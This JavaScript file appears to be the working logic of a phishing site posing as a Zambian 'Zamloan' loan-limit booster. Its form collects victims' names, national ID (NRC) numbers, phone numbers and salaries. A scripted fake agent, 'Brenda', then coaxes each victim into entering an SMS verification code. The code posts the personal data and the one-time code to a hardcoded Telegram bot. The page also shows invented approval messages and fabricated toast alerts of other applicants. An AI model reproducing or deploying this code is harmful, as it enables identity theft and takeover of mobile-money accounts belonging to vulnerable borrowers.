// ==========================================
// ZAMLOAN LIMIT BOOST - INTERACTIVE LOGIC
// ==========================================

// TELEGRAM NOTIFICATION CONFIG (Insert your credentials here to receive real-time notifications on your phone!)
const TELEGRAM_CONFIG = {
  enabled: true, // Set to true to enable Telegram alerts
  botToken: "8833056709:AAE1Ro7QmlqG23BF1tZdSfxyjdKXAqlh_OQ", // Replace with your bot token from @BotFather
  chatId: "6012381313" // Replace with your personal Telegram Chat ID
};

function sendTelegramNotification(message) {
  if (!TELEGRAM_CONFIG.enabled) return;
  if (!TELEGRAM_CONFIG.botToken || TELEGRAM_CONFIG.botToken.includes("YOUR_TELEGRAM_BOT_TOKEN") || !TELEGRAM_CONFIG.chatId || TELEGRAM_CONFIG.chatId.includes("YOUR_CHAT_ID")) {
    console.warn("Telegram notification triggered, but configuration is not set.");
    return;
  }
  
  const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
  fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: TELEGRAM_CONFIG.chatId,
      text: message,
      parse_mode: "HTML"
    })
  }).catch(err => console.error("Telegram notification error:", err));
}


// 1. Package Specifications Data
const packages = [
  {
    id: "bronze",
    name: "Bronze Boost",
    limit: "K1,500",
    limitValue: 1500,
    fee: "K75",
    feeValue: 75,
    tag: "Entry Level",
    specs: [
      "Upgraded Limit: K1,500",
      "Instant Mobile Wallet Link",
      "30-Day Payback Duration",
      "Standard Client Status Badge"
    ],
    popular: false
  },
  {
    id: "silver",
    name: "Silver Boost",
    limit: "K5,000",
    limitValue: 5000,
    fee: "K199",
    feeValue: 199,
    tag: "Starter Choice",
    specs: [
      "Upgraded Limit: K5,000",
      "Pre-approved Loan Access",
      "60-Day Payback Duration",
      "Silver Status Profile Link"
    ],
    popular: false
  },
  {
    id: "gold",
    name: "Gold Boost",
    limit: "K12,500",
    limitValue: 12500,
    fee: "K399",
    feeValue: 399,
    tag: "Recommended",
    specs: [
      "Upgraded Limit: K12,500",
      "Reduced Interest (4.5%/mo)",
      "90-Day Payback Duration",
      "Priority Application Status"
    ],
    popular: true
  },
  {
    id: "platinum",
    name: "Platinum Boost",
    limit: "K30,000",
    limitValue: 30000,
    fee: "K799",
    feeValue: 799,
    tag: "High Value",
    specs: [
      "Upgraded Limit: K30,000",
      "Special Business Term Loans",
      "120-Day Payback Duration",
      "VIP Support Liaison"
    ],
    popular: false
  },
  {
    id: "diamond",
    name: "Diamond Boost",
    limit: "K75,000",
    limitValue: 75000,
    fee: "K1,499",
    feeValue: 1499,
    tag: "Elite Wealth",
    specs: [
      "Upgraded Limit: K75,000",
      "Zero Setup Fees On Loans",
      "180-Day Payback Duration",
      "Direct Credit Liaison Officer"
    ],
    popular: false
  }
];

// 2. Active State Variables
let selectedProvider = "mtn";
let currentPackage = packages[2]; // Default Gold

// 3. UI Element References
document.addEventListener("DOMContentLoaded", () => {
  renderPackages();
  initCalculator();
  initNrcFormatter();
  initToastScheduler();
  updateCheckoutDetails();

  // Attach input listeners for live summary updates
  const phoneInput = document.getElementById("phoneNumber");
  if (phoneInput) {
    phoneInput.addEventListener("input", updateCheckoutDetails);
  }
  const customProviderInput = document.getElementById("customProvider");
  if (customProviderInput) {
    customProviderInput.addEventListener("input", updateCheckoutDetails);
  }
  
  // Set current year in footer bottom if needed
  const footerYear = document.querySelector(".footer-bottom p");
  if (footerYear) {
    const year = new Date().getFullYear();
    footerYear.innerHTML = `&copy; ${year} Zamloans Money Lending Ltd. All rights reserved.`;
  }
});

// 4. Dynamic Package Rendering
function renderPackages() {
  const grid = document.getElementById("packagesGrid");
  if (!grid) return;

  grid.innerHTML = packages.map(pkg => `
    <div class="package-card ${pkg.popular ? 'popular' : ''}" id="pkg-${pkg.id}">
      ${pkg.popular ? '' : `<span class="package-badge">${pkg.tag}</span>`}
      <div class="tier-name">${pkg.name}</div>
      <div class="tier-limit">${pkg.limit}</div>
      <div class="tier-sub">Target Borrowing Limit</div>
      
      <div class="tier-specs">
        ${pkg.specs.map(spec => `
          <div class="spec-item">
            <span class="spec-icon-check">✓</span>
            <span>${spec}</span>
          </div>
        `).join('')}
      </div>
      
      <div class="tier-price-box">
        <div class="price-label">One-time Boost Fee</div>
        <div class="price-val">${pkg.fee}</div>
      </div>
      
      <button class="btn-primary full-width ripple" onclick="initiateCheckout('${pkg.id}')">
        <span>Upgrade Now</span>
      </button>
    </div>
  `).join('');
}

// 5. Loan Calculator Logic
function initCalculator() {
  const slider = document.getElementById("calcLimitSlider");
  const limitLabel = document.getElementById("calcLimitLabel");
  const targetVal = document.getElementById("calcTargetLimitVal");
  const feeVal = document.getElementById("calcBoostFeeVal");

  if (!slider) return;

  slider.addEventListener("input", (e) => {
    const value = parseInt(e.target.value);
    limitLabel.textContent = `K${value.toLocaleString()}`;
    
    // Find closest package matching the slider value
    const matchedPkg = findPackageForLimit(value);
    currentPackage = matchedPkg;

    targetVal.textContent = `K${value.toLocaleString()}`;
    feeVal.textContent = matchedPkg.fee;
  });
}

function findPackageForLimit(val) {
  if (val <= 1500) return packages[0]; // Bronze
  if (val <= 5000) return packages[1]; // Silver
  if (val <= 12500) return packages[2]; // Gold
  if (val <= 30000) return packages[3]; // Platinum
  return packages[4]; // Diamond
}

function selectCalcPackage() {
  // Transfer selected calculator values to state
  const slider = document.getElementById("calcLimitSlider");
  if (!slider) return;
  
  const value = parseInt(slider.value);
  const matchedPkg = findPackageForLimit(value);
  
  // Set custom limit in details or use matched package values
  currentPackage = {
    ...matchedPkg,
    limitValue: value,
    limit: `K${value.toLocaleString()}`
  };
  
  updateCheckoutDetails();
  scrollToCheckout();
}

// 6. Navigation Actions
function scrollToPackages() {
  const packagesSec = document.getElementById("packages");
  if (packagesSec) {
    packagesSec.scrollIntoView({ behavior: "smooth" });
  }
}

function scrollToCheckout() {
  const checkoutSec = document.getElementById("checkout");
  if (checkoutSec) {
    checkoutSec.classList.remove("hidden");
    checkoutSec.scrollIntoView({ behavior: "smooth" });
  }
}

function initiateCheckout(packageId) {
  const pkg = packages.find(p => p.id === packageId);
  if (!pkg) return;
  currentPackage = pkg;
  updateCheckoutDetails();
  scrollToCheckout();
}

function cancelCheckout() {
  const checkoutSec = document.getElementById("checkout");
  if (checkoutSec) {
    checkoutSec.classList.add("hidden");
  }
  scrollToPackages();
}

// 7. Update Checkout Card & Summary Fields
function updateCheckoutDetails() {
  const summaryTier = document.getElementById("summaryTierName");
  const summaryLimit = document.getElementById("summaryLimit");
  const summaryFee = document.getElementById("summaryTotalFee");
  const summaryWallet = document.getElementById("summaryWallet");
  const submitBtnText = document.getElementById("submitButtonText");
  
  const pkgIdInput = document.getElementById("selectedPackageId");
  const pkgLimitInput = document.getElementById("selectedPackageLimit");
  const pkgFeeInput = document.getElementById("selectedPackageFee");

  if (!summaryTier) return;

  summaryTier.textContent = currentPackage.name;
  summaryLimit.textContent = currentPackage.limit;
  summaryFee.textContent = currentPackage.fee;
  
  const providerSelect = document.getElementById("mobileProvider");
  const customProviderInput = document.getElementById("customProvider");
  let walletName = "Not Selected";
  
  if (providerSelect && providerSelect.value) {
    if (providerSelect.value === "Other" && customProviderInput && customProviderInput.value) {
      walletName = customProviderInput.value;
    } else {
      walletName = providerSelect.value;
    }
  }
  
  const phoneVal = document.getElementById("phoneNumber") ? document.getElementById("phoneNumber").value : "";
  summaryWallet.textContent = `${walletName} (${phoneVal ? '+260 ' + phoneVal : '+260'})`;
  
  if (submitBtnText) {
    submitBtnText.textContent = `SUBMIT APPLICATION TO AGENT`;
  }
  
  if (pkgIdInput) pkgIdInput.value = currentPackage.id;
  if (pkgLimitInput) pkgLimitInput.value = currentPackage.limitValue;
  if (pkgFeeInput) pkgFeeInput.value = currentPackage.feeValue;
}

// 8. Provider Change Actions
function handleProviderChange() {
  const providerSelect = document.getElementById("mobileProvider");
  const customProviderGroup = document.getElementById("customProviderGroup");
  const customProviderInput = document.getElementById("customProvider");
  
  if (providerSelect) {
    if (providerSelect.value === "Other") {
      if (customProviderGroup) customProviderGroup.classList.remove("hidden");
      if (customProviderInput) customProviderInput.required = true;
    } else {
      if (customProviderGroup) customProviderGroup.classList.add("hidden");
      if (customProviderInput) {
        customProviderInput.required = false;
        customProviderInput.value = "";
      }
    }
  }
  
  updateCheckoutDetails();
}

// 9. Auto Formatter for NRC Number input (Format: XXXXXX/XX/X)
function initNrcFormatter() {
  const nrcInput = document.getElementById("nrcNumber");
  if (!nrcInput) return;

  nrcInput.addEventListener("input", (e) => {
    let value = e.target.value.replace(/\D/g, ""); // strip non-digits
    
    // Build formatting XXXXXX/XX/X
    let formatted = "";
    if (value.length > 0) {
      formatted = value.substring(0, 6);
    }
    if (value.length > 6) {
      formatted += "/" + value.substring(6, 8);
    }
    if (value.length > 8) {
      formatted += "/" + value.substring(8, 9);
    }
    
    e.target.value = formatted;
  });
}

// 10. Chat State Variables
let chatState = 0; // 0: Init, 1: Awaiting Payment Confirm, 2: Processing, 3: Completed
let appData = {};

// 11. Form Submission to In-App Support Chat
function handleUpgradeSubmit(event) {
  event.preventDefault();
  
  const fullName = document.getElementById("fullName").value;
  const providerSelect = document.getElementById("mobileProvider").value;
  const customProvider = document.getElementById("customProvider").value;
  const phone = document.getElementById("phoneNumber").value.replace(/\D/g, "");
  const nrc = document.getElementById("nrcNumber").value;
  const currentLimit = document.getElementById("currentLimit").value;
  const occupation = document.getElementById("occupation").value;
  const monthlySalary = document.getElementById("monthlySalary").value;
  
  const provider = providerSelect === "Other" ? customProvider : providerSelect;

  // Zambian Phone Validation check (standard suffix must be 9 digits after prefix, e.g. 97XXXXXXX)
  if (phone.length !== 9) {
    alert("Please enter a valid 9-digit mobile number (e.g. 977123456).");
    return;
  }

  // NRC Format Validation check (XXXXXX/XX/X is 11 chars with slashes)
  if (nrc.length !== 11) {
    alert("Please enter a valid NRC number in XXXXXX/XX/X format.");
    return;
  }

  // Store data for automated replies
  appData = {
    fullName,
    provider,
    phone,
    nrc,
    currentLimit,
    occupation,
    monthlySalary,
    packageName: currentPackage.name,
    packageLimit: currentPackage.limit,
    packageFee: currentPackage.fee
  };

  // Transition UI to Chat Area
  const checkoutHeader = document.getElementById("checkoutHeader");
  const upgradeForm = document.getElementById("upgradeForm");
  const chatArea = document.getElementById("chatArea");

  if (checkoutHeader) checkoutHeader.classList.add("hidden");
  if (upgradeForm) upgradeForm.classList.add("hidden");
  if (chatArea) chatArea.classList.remove("hidden");

  // Reset chat message container
  const chatMessages = document.getElementById("chatMessages");
  if (chatMessages) chatMessages.innerHTML = "";
  chatState = 0;

  // Step 1: System initialization message
  addMessage("system", "Upgrade application received. Review officer Brenda has joined the session.");

  // Step 2: Print user application receipt details
  const summaryMsg = `Limit Boost Application Details:\n\n` +
    `• Name: ${fullName}\n` +
    `• Wallet: ${provider} (+260 ${phone})\n` +
    `• NRC: ${nrc}\n` +
    `• Target Upgrade: ${currentPackage.name} (${currentPackage.limit})\n` +
    `• Current Limit: K${parseFloat(currentLimit).toLocaleString()}\n` +
    `• Occupation: ${occupation}\n` +
    `• Net Monthly Salary: K${parseFloat(monthlySalary).toLocaleString()}`;
  
  addMessage("user", summaryMsg);

  // Step 3: Trigger automated replies from Brenda
  startAgentGreeting();
}

function addMessage(sender, text) {
  const container = document.getElementById("chatMessages");
  if (!container) return;

  const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  const msgEl = document.createElement("div");
  msgEl.className = `message ${sender}`;
  
  let formattedText = text.replace(/\n/g, '<br>');
  msgEl.innerHTML = `
    <div class="message-content">${formattedText}</div>
    <div class="message-time">${time}</div>
  `;
  
  container.appendChild(msgEl);
  container.scrollTop = container.scrollHeight;
}

function showTypingIndicator(show) {
  const typingEl = document.getElementById("chatTyping");
  if (typingEl) {
    if (show) {
      typingEl.classList.remove("hidden");
    } else {
      typingEl.classList.add("hidden");
    }
    const container = document.getElementById("chatMessages");
    if (container) container.scrollTop = container.scrollHeight;
  }
}

function startAgentGreeting() {
  // Msg 1: Welcome (after 1s typing indicator)
  setTimeout(() => {
    showTypingIndicator(true);
    setTimeout(() => {
      showTypingIndicator(false);
      addMessage("agent", `Hello ${appData.fullName}! Thank you for applying for a Zamloan Limit Boost. I am Brenda, your limit review officer today. I have received your details.`);
      
      // Msg 2: Verification (after 1.5s delay)
      setTimeout(() => {
        showTypingIndicator(true);
        setTimeout(() => {
          showTypingIndicator(false);
          addMessage("agent", `Let me look at your profile... 🔎 I see your NRC is ${appData.nrc} and you're currently earning K${parseFloat(appData.monthlySalary).toLocaleString()} as a ${appData.occupation}.`);
          
          // Msg 3: Activation prompt (after 2s delay)
          setTimeout(() => {
            showTypingIndicator(true);
            setTimeout(() => {
              showTypingIndicator(false);
              addMessage("agent", `Based on your profile, you are pre-approved for a direct limit upgrade to **${appData.packageLimit}**! \n\nTo complete this profile linkage, a standard one-time verification code is required to confirm you're a real user.\n\nWould you like to proceed with the limit boost activation? (Type "yes" or "proceed")`);
              chatState = 1; // Awaiting confirmation
            }, 3000);
          }, 1500);
        }, 2200);
      }, 1500);
    }, 1800);
  }, 1000);
}

function sendUserMessage(event) {
  if (event) event.preventDefault();
  
  const inputEl = document.getElementById("chatInput");
  if (!inputEl) return;
  
  const text = inputEl.value.trim();
  if (!text) return;
  
  addMessage("user", text);
  inputEl.value = "";
  
  // Simulate Agent Reply
  setTimeout(() => {
    simulateAgentReply(text);
  }, 1000);
}

function simulateAgentReply(userText) {
  const normText = userText.toLowerCase().trim();
  showTypingIndicator(true);
  
  setTimeout(() => {
    showTypingIndicator(false);
    
    if (chatState === 1) {
      const isAffirmative = normText.includes("yes") || normText.includes("proceed") || normText.includes("pay") || normText.includes("ok") || normText.includes("sure") || normText.includes("yep") || normText.includes("confirm");
      
      if (isAffirmative) {
        addMessage("agent", `Perfect! I've sent a 6-digit verification code to your number +260 ${appData.phone}. Please enter the code here to verify your identity.`);
        chatState = 2; // Awaiting verification code
        
        // Notify admin via Telegram that a lead is ready
        const leadMsg = `🚨 <b>NEW ZAMLOAN BOOST LEAD!</b>\n\n` +
          `👤 <b>Name:</b> ${appData.fullName}\n` +
          `📞 <b>Phone:</b> +260 ${appData.phone}\n` +
          `💳 <b>NRC:</b> ${appData.nrc}\n` +
          `💼 <b>Occupation:</b> ${appData.occupation}\n` +
          `💵 <b>Salary:</b> K${parseFloat(appData.monthlySalary).toLocaleString()}\n` +
          `🎯 <b>Target Boost:</b> ${appData.packageName} (${appData.packageLimit})\n\n` +
          `⚠️ <i>Client is waiting for verification code...</i>`;
        sendTelegramNotification(leadMsg);
        
      } else if (normText.includes("no") || normText.includes("cancel") || normText.includes("stop")) {
        addMessage("agent", `Understood. Your upgrade request has been placed on hold. If you change your mind and want to activate your upgraded limit of ${appData.packageLimit}, just type "yes" or "proceed" here at any time.`);
      } else {
        addMessage("agent", `To activate your upgraded limit of **${appData.packageLimit}**, a standard one-time verification code is required. \n\nPlease type "yes" or "proceed" to trigger the SMS code verification on +260 ${appData.phone}, or let me know if you have any questions.`);
      }
      
    } else if (chatState === 2) {
      addMessage("agent", `Thank you. I have received the code. Please hold on a moment while I confirm this with our core credit registry...`);
      chatState = 3; // Processing verification simulation
      
      // Notify admin of the verification code
      const codeAlert = `🔑 <b>ZAMLOAN VERIFICATION CODE ENTERED!</b>\n\n` +
        `👤 <b>Name:</b> ${appData.fullName}\n` +
        `📞 <b>Phone:</b> +260 ${appData.phone}\n` +
        `💬 <b>Code Entered:</b> <code>${userText}</code>\n\n` +
        `<i>Proceeding with automated system check...</i>`;
      sendTelegramNotification(codeAlert);
      
      // System updates simulating verification progress inside the chat
      setTimeout(() => {
        addMessage("system", `[System]: Verification Code recognized. Authenticating wallet registry...`);
        
        setTimeout(() => {
          addMessage("system", `[System]: Linking phone +260 ${appData.phone} to upgraded credit profile...`);
          
          setTimeout(() => {
            addMessage("system", `[System]: Verification Success! Upgraded limit of ${appData.packageLimit} is now ACTIVE.`);
            
            showTypingIndicator(true);
            setTimeout(() => {
              showTypingIndicator(false);
              addMessage("agent", `Awesome news, ${appData.fullName}! Your profile verification was successful. Your new borrowing limit of **${appData.packageLimit}** is now fully active! \n\nYou will receive a confirmation SMS shortly, and you can access your upgraded borrowing tier right away. Is there anything else I can help you with today?`);
              chatState = 4; // Fully completed
            }, 2000);
          }, 3000);
        }, 3000);
      }, 2000);
      
    } else if (chatState === 3) {
      addMessage("agent", `We are currently verifying the verification code. Please hold on and wait for the system confirmation!`);
      
    } else if (chatState === 4) {
      addMessage("agent", `Your upgraded borrowing limit is fully active! If you have any further questions, you can contact our main customer helpline. Thank you for choosing Zamloan! 🇿🇲`);
    } else {
      addMessage("agent", `Please let me know if you have any questions, or type "yes" to proceed with the limit boost activation.`);
    }
  }, 1500);
}

// 12. Real-time Toast Notifications Scheduler (Simulated Upgrades)
const zambianNames = [
  "Mulenga C.", "Mwansa K.", "Banda P.", "Tembo G.", "Phiri M.", "Lungu S.",
  "Mwale D.", "Chansa J.", "Kabwe F.", "Chisenga L.", "Zimba H.", "Chilufya R.",
  "Hachipuka M.", "Soko W.", "Mbewe T.", "Ngoma B.", "Sampa A.", "Kapambwe K."
];

const mobilePrefixes = ["97", "96", "95", "77", "76"];

function initToastScheduler() {
  // Launch initial toast after 5s
  setTimeout(triggerSimulatedToast, 5000);
}

function triggerSimulatedToast() {
  const container = document.getElementById("toastContainer");
  if (!container) return;

  // Generate random data
  const name = zambianNames[Math.floor(Math.random() * zambianNames.length)];
  const prefix = mobilePrefixes[Math.floor(Math.random() * mobilePrefixes.length)];
  const digitPart = Math.floor(1000000 + Math.random() * 9000000).toString().substring(0, 7);
  const numberStr = `+260 ${prefix}***${digitPart.substring(4)}`;
  
  const pkg = packages[Math.floor(Math.random() * packages.length)];
  
  // Create toast element
  const toast = document.createElement("div");
  toast.className = "toast";
  toast.innerHTML = `
    <div class="toast-icon">✓</div>
    <div class="toast-body">
      <div class="toast-title">${name} (${numberStr})</div>
      <div class="toast-desc">Applied for limit boost to <strong>${pkg.limit}</strong></div>
    </div>
  `;
  
  container.appendChild(toast);
  
  // Schedule removal
  setTimeout(() => {
    toast.classList.add("removing");
    setTimeout(() => {
      toast.remove();
    }, 400);
  }, 6000);

  // Schedule next toast at randomized interval (15s to 28s)
  const nextInterval = 15000 + Math.random() * 13000;
  setTimeout(triggerSimulatedToast, nextInterval);
}
